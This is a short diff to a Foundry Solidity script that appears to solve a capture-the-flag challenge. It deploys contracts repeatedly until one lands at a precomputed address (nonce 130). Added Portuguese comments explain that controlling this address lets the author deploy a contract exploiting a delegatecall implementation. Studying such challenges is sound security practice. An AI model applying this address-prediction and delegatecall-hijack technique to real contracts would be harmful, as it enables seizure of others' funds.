@@ -26,7 +26,9 @@ contract PortalNoncenseSolution is Script {
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_PORTAL_NONCENSE"));
         MyContract contractNew;
-        for (uint i=0; i <= 130; i++) {
+        for (uint i=0; i <= 130; i++) { 
+            //usei o script python em auxiliar_src/getNonceCreate.py pra saber que na transação 130 (nonce 130) nós conseguimos criar um contrato com endereço 0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007
+            //Conseguindo escrever nesse endereço nós criamos o nosso contrato que explora a implementação de delegatecall
             contractNew = new MyContract();
             if (address(contractNew) == address(0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007)) {
                 break;
